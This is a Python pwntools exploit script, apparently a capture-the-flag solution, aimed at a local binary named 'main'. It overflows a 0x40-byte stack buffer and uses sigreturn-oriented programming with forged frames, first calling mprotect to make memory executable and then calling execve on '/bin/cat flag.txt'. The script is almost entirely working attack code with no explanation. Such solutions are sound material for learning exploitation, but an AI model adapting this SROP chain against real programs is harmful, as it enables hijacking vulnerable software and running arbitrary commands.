from pwn import*

elf = context.binary = ELF('./main')
p = process()

rop = ROP(elf)

frame = SigreturnFrame()
frame.rdi = 0x402000
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rax = 0xa
frame.rip = 0x40103b
frame.rsp = 0x402040

payload = ( 
        b'A' * 0x40
        + p64(rop.find_gadget(['pop rax', 'ret'])[0])
        + p64(0xf)
        + p64(rop.find_gadget(['syscall'])[0])
        + bytes(frame)
        )



sleep(0.2)
p.sendline(payload)

#exploit goes here 
args = b'/bin/cat\x00flag.txt\x00'
argv = p64(0x402000 + len(args) + 0x8) + p64(0x402000) + p64(0x402009) + p64(0x0)

frame.rdi = 0x402000
frame.rsi = 0x402000 + len(args) + 8
frame.rdx = 0x0
frame.rax = 0x3b
frame.rip = 0x40103b

payload = (
        args
        + argv
        + b'A' * (0x40 - len(args + argv))
        + p64(rop.find_gadget(['pop rax', 'ret'])[0])
        + p64(0xf)
        + p64(rop.find_gadget(['syscall'])[0])
        + bytes(frame)
        )

sleep(0.2)
p.sendline(payload)

p.interactive()
